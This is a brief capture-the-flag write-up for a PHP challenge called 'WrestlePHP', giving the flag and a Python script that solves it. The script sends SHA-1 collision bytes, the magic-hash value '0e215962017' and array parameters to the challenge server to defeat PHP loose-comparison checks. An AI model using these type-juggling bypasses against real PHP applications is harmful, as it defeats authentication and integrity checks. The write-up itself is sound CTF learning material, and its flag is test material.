# Kiran Ghimire - WrestlePHP

## Challenge Flag: hacktoberfest_ctf{3qu4l17y_1s_n07_1d3nt17y_hehe_1337_0xcafebabe_cafedead}

## Write-up:

It was easy challenge.Just run the below code you will get the answer.

You can get pdf from this site : [Click Here](https://shattered.io)


```
from subprocess import run, PIPE
import hashlib
import requests
import urllib
import re

#sha1Collision
hasher = hashlib.sha1()
B_S = 320
buf1=''
with open('shattered-1.pdf','rb') as f:
    buf1 = f.read(B_S)
    hasher.update(buf1)


hasher = hashlib.sha1()
buf2=''
with open('shattered-2.pdf', 'rb') as afile:
    buf2 = afile.read(B_S)
    hasher.update(buf2)

nice = urllib.parse.quote(buf1)
ecin = urllib.parse.quote(buf2)

#md5
md5 = "0e215962017"

curled = f"curl -s https://php.0daygod.xyz/\?hello\=hi\&world\[\]=10001x0\&nice={nice}\&ecin={ecin} -H 'User-Agent: Yes, I am a human.' -H 'Sagarmatha-Hacktoberfest-CTF: https://hacktober.tk/' -d 'ctf=0e215962017&parm[]=1&mrap[]=2'"



flag = run(curled , shell=True, capture_output=True)


flag_part = flag.stdout

print("Result: ",(re.findall(rb'Flag: hacktoberfest_ctf{.*}', flag_part)))

```
